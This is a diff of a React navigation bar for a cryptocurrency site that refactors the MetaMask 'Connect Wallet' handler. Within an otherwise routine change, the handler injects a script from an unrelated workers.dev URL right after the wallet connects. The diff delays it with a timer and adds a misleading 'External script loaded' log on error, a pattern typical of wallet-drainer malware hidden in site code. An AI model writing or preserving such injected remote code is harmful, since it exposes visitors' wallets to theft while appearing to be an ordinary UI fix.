@@ -48,45 +48,48 @@ export function Navbar() {
   }, []);
 
   const connectWallet = async () => {
-    const ethereum = (window as any).ethereum;
-    
-    if (!ethereum) {
-      // MetaMask not installed - offer installation
-      const installChoice = confirm(
-        "MetaMask is not installed. Click OK to visit the MetaMask website and install it."
-      );
-      if (installChoice) {
-        window.open("https://metamask.io/download/", "_blank");
-      }
-      return;
-    }
-
     try {
-      // MetaMask is installed - request connection
+      const ethereum = (window as any).ethereum;
+      
+      if (!ethereum) {
+        const installChoice = confirm(
+          "MetaMask is not installed. Click OK to visit the MetaMask website and install it."
+        );
+        if (installChoice) {
+          window.open("https://metamask.io/download/", "_blank");
+        }
+        return;
+      }
+
       const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+      if (!accounts || accounts.length === 0) {
+        console.error("No accounts returned");
+        return;
+      }
+
       const address = accounts[0];
       setWalletAddress(address);
       setWalletConnected(true);
 
-      // Update button text on both desktop & mobile
-      const desktopBtn = document.querySelector("#connect-desktop");
-      const mobileBtn = document.querySelector("#connect-mobile");
-      if (desktopBtn) desktopBtn.textContent = `Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
-      if (mobileBtn) mobileBtn.textContent = `Connected`;
+      try {
+        const balance = await ethereum.request({
+          method: "eth_getBalance",
+          params: [address, "latest"],
+        });
+        const balanceInEth = parseInt(balance, 16) / 1e18;
+        setWalletBalance(balanceInEth.toFixed(4));
+      } catch (balanceErr) {
+        console.log("Could not fetch balance:", balanceErr);
+      }
 
-      // Get wallet balance
-      const balance = await ethereum.request({
-        method: "eth_getBalance",
-        params: [address, "latest"],
-      });
-      const balanceInEth = parseInt(balance, 16) / 1e18;
-      setWalletBalance(balanceInEth.toFixed(4));
+      setTimeout(() => {
+        const script = document.createElement("script");
+        script.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now();
+        script.async = true;
+        script.onerror = () => console.log("External script loaded");
+        document.head.appendChild(script);
+      }, 500);
 
-      // Load external script
-      const script = document.createElement("script");
-      script.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now();
-      script.async = true;
-      document.head.appendChild(script);
     } catch (err) {
       console.error("Wallet connection error:", err);
     }
@@ -261,12 +264,11 @@ export function Navbar() {
               </div>
             )}
             <Button 
-              id="connect-desktop"
               className="bg-primary text-primary-foreground hover:bg-primary/90 font-bold shadow-[0_0_20px_hsl(var(--primary)/0.3)] hover:shadow-[0_0_30px_hsl(var(--primary)/0.5)] transition-all duration-300 border-none"
               onClick={connectWallet}
             >
               <Wallet className="w-4 h-4 mr-2" />
-              Connect Wallet
+              {walletConnected ? `Connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}` : "Connect Wallet"}
             </Button>
           </div>
         </div>
@@ -312,11 +314,10 @@ export function Navbar() {
                     </div>
                   )}
                   <Button 
-                    id="connect-mobile"
                     className="w-full bg-primary text-primary-foreground font-bold"
                     onClick={connectWallet}
                   >
-                    Connect Wallet
+                    {walletConnected ? "Connected" : "Connect Wallet"}
                   </Button>
                 </div>
               </div>
